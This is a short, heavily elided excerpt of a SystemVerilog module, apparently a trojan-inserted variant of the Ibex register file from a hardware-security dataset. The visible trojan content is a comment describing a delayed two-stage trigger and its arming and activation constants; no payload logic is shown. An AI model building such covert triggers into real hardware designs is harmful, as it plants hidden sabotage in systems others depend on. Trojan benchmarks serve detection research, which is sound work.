 ...
 */
module ibex_register_file_latch_trojan_Covert #(
  ...
  output logic                 err_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=11353, act=5676)
    // ============================================================
    localparam int ARM_THRESHOLD   = 11353;
    localparam int ACTIVATE_DELAY  = 5676;
